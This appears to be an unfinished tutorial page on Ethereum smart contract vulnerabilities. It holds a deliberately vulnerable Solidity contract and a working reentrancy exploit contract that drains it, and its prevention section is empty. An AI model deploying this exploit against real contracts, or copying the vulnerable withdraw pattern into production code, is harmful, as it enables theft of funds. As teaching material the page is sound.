# Common vulnerabilities in Ethereum and EVM based chains

Solidity cheatsheet is available in [solidity-cheatsheet](/README.md).

## Table of contents

- [Common vulnerabilities in Ethereum and EVM based chains](#common-vulnerabilities-in-ethereum-and-evm-based-chains)
  * [Table of contents](#table-of-contents)
  * [Motivation](#motivation)
  * [Reentrancy](#reentrancy)
    + [Examples](#reentrancy-example)
    + [How to prevent reentrancy attacks](#how-to-prevent-reentrancy-attacks)
  * [Arithmetic overflows and underflows](#arithmetic-overflows-and-underflows)

### Motivation

TBD

### Reentrancy

Computer scientists say that a procedure is re-entrant if its execution can be interrupted in the middle, initiated over (re-entered), and both runs can complete without any errors in execution. In the context of Ethereum smart contracts, re-entrancy can lead to serious vulnerabilities. 

The most famous example of this was the DAO Hack, where $70million worth of Ether was siphoned off.

### Reentrancy example
```solidity
pragma solidity ^0.6.0;

import '@openzeppelin/contracts/math/SafeMath.sol';

contract Reentrance {
  
  using SafeMath for uint256;
  mapping(address => uint) public balances;

  function donate(address _to) public payable {
    balances[_to] = balances[_to].add(msg.value);
  }

  function balanceOf(address _who) public view returns (uint balance) {
    return balances[_who];
  }

  function withdraw(uint _amount) public {
    if(balances[msg.sender] >= _amount) {
      (bool result, bytes memory data) = msg.sender.call.value(_amount)("");
      if(result) {
        _amount;
      }
      balances[msg.sender] -= _amount;
    }
  }

  fallback() external payable {}
}
```

The above smart contract can be exploited using a simple reentrancy attack. Example below:
```solidity
pragma solidity ^0.6.0;

contract Exploiter {
    address private owner;
    address payable vault = <address of the exploited contract>;
    Reentrancy exploited = Reentrancy(<address of the exploited contract>);
    
    constructor() public payable{
        owner = msg.sender;
    }
    
    modifier onlyOwner {
        require(msg.sender == owner, "Only owner: operation not allowed");
        _;
    }
    
    function deposit() public onlyOwner {
        exploited.donate{value: 1 ether}(address(this));
    }
    
    function attack() public onlyOwner {
        exploited.withdraw(0.5 ether);
    }
    
    function selfkill() public onlyOwner {
        selfdestruct(payable(owner));
    }
    
    fallback() external payable {
        if ( vault.balance > 0 ){
            exploited.withdraw(0.5 ether);
        }
    }
}
```
### How to prevent Reentrancy attacks:



